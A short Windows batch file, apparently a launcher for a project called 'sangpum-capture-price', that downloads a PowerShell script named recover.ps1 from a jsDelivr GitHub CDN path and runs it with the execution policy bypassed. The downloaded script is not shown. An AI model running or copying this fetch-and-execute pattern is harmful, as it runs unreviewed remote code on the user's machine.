@echo off
setlocal
cd /d "%~dp0"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://cdn.jsdelivr.net/gh/waterstar21g-png/sangpum-capture-price@main/recover.ps1' -OutFile 'recover.ps1' -UseBasicParsing"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0recover.ps1"
if errorlevel 1 pause
